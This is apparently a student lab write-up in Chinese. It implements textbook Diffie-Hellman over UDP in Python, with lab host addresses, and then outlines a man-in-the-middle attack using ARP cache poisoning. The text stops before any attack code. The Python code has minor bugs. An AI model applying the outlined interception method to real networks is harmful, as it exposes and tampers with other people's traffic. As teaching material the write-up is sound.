<p>先来张图介绍一下<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>D</mi><mi>i</mi><mi>f</mi><mi>f</mi><mi>i</mi><mi>e</mi><mo>−</mo><mi>H</mi><mi>e</mi><mi>l</mi><mi>l</mi><mi>m</mi><mi>a</mi><mi>n</mi></mrow><annotation encoding="application/x-tex">Diffie-Hellman</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">D</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault">i</span><span class="mord mathdefault">e</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.08125em;">H</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">m</span><span class="mord mathdefault">a</span><span class="mord mathdefault">n</span></span></span></span>算法的基本原理，当然，这里使用的是教科书上的DH交换算法，在实际应用中并不会如此简单。</p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210619203314.png" alt="alt DH交换算法" /></p>
<p>基于之前学过的信安数学中的基本原理，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>A</mi><mi>l</mi><mi>i</mi><mi>c</mi><mi>e</mi></mrow><annotation encoding="application/x-tex">Alice</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">A</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">i</span><span class="mord mathdefault">c</span><span class="mord mathdefault">e</span></span></span></span>与<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>B</mi><mi>o</mi><mi>b</mi></mrow><annotation encoding="application/x-tex">Bob</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.05017em;">B</span><span class="mord mathdefault">o</span><span class="mord mathdefault">b</span></span></span></span>之间共享的是大素数<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">p</span></span></span></span>与对应乘法群<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msubsup><mi>Z</mi><mi>p</mi><mo>∗</mo></msubsup></mrow><annotation encoding="application/x-tex">Z_p^*</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.071804em;vertical-align:-0.383108em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">Z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.688696em;"><span style="top:-2.4530000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">p</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.383108em;"><span></span></span></span></span></span></span></span></span></span>的一个本原元<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>g</mi></mrow><annotation encoding="application/x-tex">g</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span></span></span></span>，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>A</mi><mi>l</mi><mi>i</mi><mi>c</mi><mi>e</mi></mrow><annotation encoding="application/x-tex">Alice</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">A</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">i</span><span class="mord mathdefault">c</span><span class="mord mathdefault">e</span></span></span></span>向<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>B</mi><mi>o</mi><mi>b</mi></mrow><annotation encoding="application/x-tex">Bob</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.05017em;">B</span><span class="mord mathdefault">o</span><span class="mord mathdefault">b</span></span></span></span>发送自己的<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>A</mi><mo>=</mo><msup><mi>g</mi><mi>a</mi></msup></mrow><annotation encoding="application/x-tex">A=g^a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault">A</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.858832em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">a</span></span></span></span></span></span></span></span></span></span></span>，同时<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>B</mi><mi>o</mi><mi>b</mi></mrow><annotation encoding="application/x-tex">Bob</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.05017em;">B</span><span class="mord mathdefault">o</span><span class="mord mathdefault">b</span></span></span></span>向<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>A</mi><mi>l</mi><mi>i</mi><mi>c</mi><mi>e</mi></mrow><annotation encoding="application/x-tex">Alice</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">A</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">i</span><span class="mord mathdefault">c</span><span class="mord mathdefault">e</span></span></span></span>发送自己的<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>B</mi><mo>=</mo><msup><mi>g</mi><mi>b</mi></msup></mrow><annotation encoding="application/x-tex">B=g^b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.05017em;">B</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.043548em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">b</span></span></span></span></span></span></span></span></span></span></span>，这样二者都可以计算出密钥<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>K</mi><mo>=</mo><msup><mi>g</mi><mrow><mi>a</mi><mi>b</mi></mrow></msup><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext>  </mtext><mi>p</mi></mrow><annotation encoding="application/x-tex">K=g^{ab}\ mod \;p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.043548em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">a</span><span class="mord mathdefault mtight">b</span></span></span></span></span></span></span></span></span><span class="mspace"> </span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault">p</span></span></span></span>,对应的破解难题是离散对数问题。</p>
<hr />
<h1 id="简单dh交换的实现"><a class="markdownIt-Anchor" href="#简单dh交换的实现"></a> 简单DH交换的实现</h1>
<h2 id="设计报文格式"><a class="markdownIt-Anchor" href="#设计报文格式"></a> 设计报文格式</h2>
<p>这里简单的设计报文格式为：</p>
<table>
<thead>
<tr>
<th style="text-align:center">字段</th>
<th style="text-align:center">标志位flag​</th>
<th style="text-align:center">p的位数len_p</th>
<th style="text-align:center">p</th>
<th style="text-align:center">g的位数len_g</th>
<th style="text-align:center">g</th>
<th style="text-align:center">计算数（如A)</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">长度</td>
<td style="text-align:center">1</td>
<td style="text-align:center">1</td>
<td style="text-align:center">len_p</td>
<td style="text-align:center">1</td>
<td style="text-align:center">len_g</td>
<td style="text-align:center">不定</td>
</tr>
</tbody>
</table>
<p>在下面的代码中，由字符串的长度减去<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>f</mi><mi>l</mi><mi>a</mi><mi>g</mi><mi mathvariant="normal">、</mi><mi>p</mi><mi mathvariant="normal">、</mi><mi>g</mi></mrow><annotation encoding="application/x-tex">flag、p、g</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord cjk_fallback">、</span><span class="mord mathdefault">p</span><span class="mord cjk_fallback">、</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span></span></span></span>等可以计算出计算数的位数，数据包基于UDP协议进行实现。这里由<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>H</mi><mi>o</mi><mi>s</mi><mi>t</mi><mi>A</mi></mrow><annotation encoding="application/x-tex">HostA</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.08125em;">H</span><span class="mord mathdefault">o</span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mord mathdefault">A</span></span></span></span>主机扮演<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>A</mi><mi>l</mi><mi>i</mi><mi>c</mi><mi>e</mi></mrow><annotation encoding="application/x-tex">Alice</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">A</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">i</span><span class="mord mathdefault">c</span><span class="mord mathdefault">e</span></span></span></span>，由<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>S</mi><mi>e</mi><mi>r</mi><mi>v</mi><mi>e</mi><mi>r</mi><mn>2</mn></mrow><annotation encoding="application/x-tex">Server2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord">2</span></span></span></span>主机扮演<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>B</mi><mi>o</mi><mi>b</mi></mrow><annotation encoding="application/x-tex">Bob</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.05017em;">B</span><span class="mord mathdefault">o</span><span class="mord mathdefault">b</span></span></span></span>，而由<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>H</mi><mi>o</mi><mi>s</mi><mi>t</mi><mi>M</mi></mrow><annotation encoding="application/x-tex">HostM</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.08125em;">H</span><span class="mord mathdefault">o</span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.10903em;">M</span></span></span></span>主机扮演接下来任务中的中间人，相关主机的<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>I</mi><mi>P</mi></mrow><annotation encoding="application/x-tex">IP</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span></span></span></span>地址及<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>M</mi><mi>A</mi><mi>C</mi></mrow><annotation encoding="application/x-tex">MAC</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.10903em;">M</span><span class="mord mathdefault">A</span><span class="mord mathdefault" style="margin-right:0.07153em;">C</span></span></span></span>地址见下表：</p>
<table>
<thead>
<tr>
<th style="text-align:center">主机名</th>
<th style="text-align:center">HostA</th>
<th style="text-align:center">HostM</th>
<th style="text-align:center">Server2</th>
<th style="text-align:center">网关</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">IP地址</td>
<td style="text-align:center">192.168.60.2</td>
<td style="text-align:center">192.168.60.3</td>
<td style="text-align:center">10.0.2.7</td>
<td style="text-align:center">192.168.60.1</td>
</tr>
<tr>
<td style="text-align:center">MAC地址</td>
<td style="text-align:center">02:42:c0:a8:3c:02</td>
<td style="text-align:center">02:42:c0:a8:3c:03</td>
<td style="text-align:center">02:42:0a:00:02:07</td>
<td style="text-align:center">02:42:90:9b:17:90</td>
</tr>
</tbody>
</table>
<h2 id="hosta与server2的dh通信实现"><a class="markdownIt-Anchor" href="#hosta与server2的dh通信实现"></a> <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>H</mi><mi>o</mi><mi>s</mi><mi>t</mi><mi>A</mi></mrow><annotation encoding="application/x-tex">HostA</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.08125em;">H</span><span class="mord mathdefault">o</span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mord mathdefault">A</span></span></span></span>与<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>S</mi><mi>e</mi><mi>r</mi><mi>v</mi><mi>e</mi><mi>r</mi><mn>2</mn></mrow><annotation encoding="application/x-tex">Server2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord">2</span></span></span></span>的DH通信实现</h2>
<p>代码如下(<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>H</mi><mi>o</mi><mi>s</mi><mi>t</mi><mi>A</mi></mrow><annotation encoding="application/x-tex">HostA</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.08125em;">H</span><span class="mord mathdefault">o</span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mord mathdefault">A</span></span></span></span>为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>c</mi><mi>l</mi><mi>i</mi><mi>e</mi><mi>n</mi><mi>t</mi></mrow><annotation encoding="application/x-tex">client</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">c</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">i</span><span class="mord mathdefault">e</span><span class="mord mathdefault">n</span><span class="mord mathdefault">t</span></span></span></span>端，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>S</mi><mi>e</mi><mi>r</mi><mi>v</mi><mi>e</mi><mi>r</mi><mn>2</mn></mrow><annotation encoding="application/x-tex">Server2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord">2</span></span></span></span>为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>S</mi><mi>e</mi><mi>r</mi><mi>v</mi><mi>e</mi><mi>r</mi></mrow><annotation encoding="application/x-tex">Server</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span></span></span></span>端):</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Client端</span></span><br><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_cal</span>(<span class="params">a,rand,p</span>):</span></span><br><span class="line">    cal = (a**rand) % p</span><br><span class="line">    <span class="keyword">return</span> cal</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_key</span>(<span class="params">di,mi,p</span>):</span></span><br><span class="line">    key = (di ** mi ) % p</span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">  udp_client=socket(AF_INET,SOCK_DGRAM)</span><br><span class="line">  len_p=<span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;Please input Length of P:&quot;</span>))</span><br><span class="line">  len_g=<span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;Please input Length of g:&quot;</span>))</span><br><span class="line">  p=<span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;Please input the P:&quot;</span>))</span><br><span class="line">  g=<span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;Please input the g:&quot;</span>))</span><br><span class="line">  A=<span class="number">101</span></span><br><span class="line">  Ya=get_cal(g,A,p)</span><br><span class="line">  msg=<span class="string">&quot;0&quot;</span>+<span class="built_in">str</span>(len_p)+<span class="built_in">str</span>(p)+<span class="built_in">str</span>(len_g)+<span class="built_in">str</span>(g)+<span class="built_in">str</span>(Ya)</span><br><span class="line">  udp_client.sendto(msg.encode(<span class="string">&#x27;utf-8&#x27;</span>),(<span class="string">&#x27;10.0.2.7&#x27;</span>,<span class="number">9010</span>))</span><br><span class="line">  key=<span class="number">0</span></span><br><span class="line">  data,addr = udp_client.recvfrom(<span class="number">1024</span>)</span><br><span class="line">  <span class="built_in">print</span>(data)</span><br><span class="line">  <span class="built_in">print</span>(addr)</span><br><span class="line">  <span class="keyword">if</span> data[<span class="number">0</span>] == <span class="string">&#x27;1&#x27;</span> :</span><br><span class="line">         Yb_str=<span class="string">&quot;&quot;</span></span><br><span class="line">         len_msg=<span class="built_in">len</span>(data)</span><br><span class="line">         <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(len_p+len_g+<span class="number">3</span>,len_msg):</span><br><span class="line">             Yb_str+=<span class="built_in">str</span>(data[i])</span><br><span class="line">         Yb=<span class="built_in">int</span>(Yb_str)</span><br><span class="line">         Key=get_key(Yb,A,p)</span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&quot;The Key is %d &quot;</span>,Key)</span><br><span class="line">  <span class="keyword">else</span> :</span><br><span class="line">         udp_client.sendto(msg,(<span class="string">&#x27;10.0.2.7&#x27;</span>,<span class="number">9010</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Server端</span></span><br><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_cal</span>(<span class="params">a,rand,p</span>):</span></span><br><span class="line">    cal = (a**rand) % p</span><br><span class="line">    <span class="keyword">return</span> cal</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_key</span>(<span class="params">di,mi,p</span>):</span></span><br><span class="line">    key = (di ** mi ) % p</span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">   udp_srv=socket(AF_INET,SOCK_DGRAM)</span><br><span class="line">   udp_srv.bind((<span class="string">&#x27;10.0.2.7&#x27;</span>,<span class="number">9010</span>))</span><br><span class="line">   B=<span class="number">89</span></span><br><span class="line">   p_str=<span class="string">&quot;&quot;</span></span><br><span class="line">   g_str=<span class="string">&quot;&quot;</span></span><br><span class="line">   Ya_str=<span class="string">&quot;&quot;</span></span><br><span class="line">   data,addr=udp_srv.recvfrom(<span class="number">1024</span>)</span><br><span class="line">   <span class="built_in">print</span>(data)</span><br><span class="line">   <span class="built_in">print</span>(addr)</span><br><span class="line">   <span class="keyword">if</span> data[<span class="number">0</span>] == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">         len_p=<span class="built_in">int</span>(data[<span class="number">1</span>])</span><br><span class="line">         <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,len_p+<span class="number">2</span>):</span><br><span class="line">             p_str+=<span class="built_in">str</span>(data[i])</span><br><span class="line">         p=<span class="built_in">int</span>(p_str)</span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&quot;The received P is %d&quot;</span>,p)</span><br><span class="line">         len_g=<span class="built_in">int</span>(data[len_p+<span class="number">2</span>])</span><br><span class="line">         <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(len_p+<span class="number">3</span>,len_p+len_g+<span class="number">3</span>):</span><br><span class="line">             g_str+=<span class="built_in">str</span>(data[i])</span><br><span class="line">         g=<span class="built_in">int</span>(g_str)</span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&quot;The received g is %d&quot;</span>,g)</span><br><span class="line">         len_msg=<span class="built_in">len</span>(data)</span><br><span class="line">         <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(len_p+len_g+<span class="number">3</span>,len_msg):</span><br><span class="line">             Ya_str+=<span class="built_in">str</span>(data[i])</span><br><span class="line">         Ya=<span class="built_in">int</span>(Ya_str)</span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&quot;The received Ya is %d&quot;</span>,Ya)</span><br><span class="line">         Yb=get_cal(g,B,p)</span><br><span class="line">         msg=<span class="string">&quot;1&quot;</span>+<span class="built_in">str</span>(len_p)+<span class="built_in">str</span>(p)+<span class="built_in">str</span>(len_g)+<span class="built_in">str</span>(g)+<span class="built_in">str</span>(Yb)</span><br><span class="line">         udp_srv.sendto(msg,addr)</span><br><span class="line">         Key=get_key(Ya,B,p)</span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&quot;The key is : %d&quot;</span>,Key)</span><br><span class="line">   <span class="keyword">else</span> :</span><br><span class="line">         msg=<span class="string">&quot;Error!&quot;</span></span><br><span class="line">         udp_srv.sendto(msg,addr)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>相关的过程及解释见下面的实验截图：</p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/QQ%E6%88%AA%E5%9B%BE20210618002652.png" alt="alt 1" /></p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/QQ%E6%88%AA%E5%9B%BE20210618002823.png" alt="alt 2" /></p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/QQ%E6%88%AA%E5%9B%BE20210619152958.png" alt="alt 3" /></p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/QQ%E6%88%AA%E5%9B%BE20210619153112.png" alt="alt 4" /></p>
<hr />
<h1 id="hostm介入中间人进行攻击"><a class="markdownIt-Anchor" href="#hostm介入中间人进行攻击"></a> <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>H</mi><mi>o</mi><mi>s</mi><mi>t</mi><mi>M</mi></mrow><annotation encoding="application/x-tex">HostM</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.08125em;">H</span><span class="mord mathdefault">o</span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.10903em;">M</span></span></span></span>介入中间人进行攻击</h1>
<p>基于上次实验中的<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>A</mi><mi>R</mi><mi>P</mi></mrow><annotation encoding="application/x-tex">ARP</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault">A</span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span></span></span></span>缓存攻击，先造成<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>A</mi><mi>l</mi><mi>i</mi><mi>c</mi><mi>e</mi></mrow><annotation encoding="application/x-tex">Alice</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">A</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">i</span><span class="mord mathdefault">c</span><span class="mord mathdefault">e</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>B</mi><mi>o</mi><mi>b</mi></mrow><annotation encoding="application/x-tex">Bob</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.05017em;">B</span><span class="mord mathdefault">o</span><span class="mord mathdefault">b</span></span></span></span>的<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>A</mi><mi>R</mi><mi>P</mi></mrow><annotation encoding="application/x-tex">ARP</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault">A</span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span></span></span></span>中毒，使得他们发送的包都会被<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>H</mi><mi>o</mi><mi>s</mi><mi>t</mi><mi>M</mi></mrow><annotation encoding="application/x-tex">HostM</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.08125em;">H</span><span class="mord mathdefault">o</span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.10903em;">M</span></span></span></span>进行拦截并对内容加以修改后再发送包出去即可，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>A</mi><mi>R</mi><mi>P</mi></mrow><annotation encoding="application/x-tex">ARP</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault">A</span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span></span></span></span>缓存中毒的代码如下：</p>
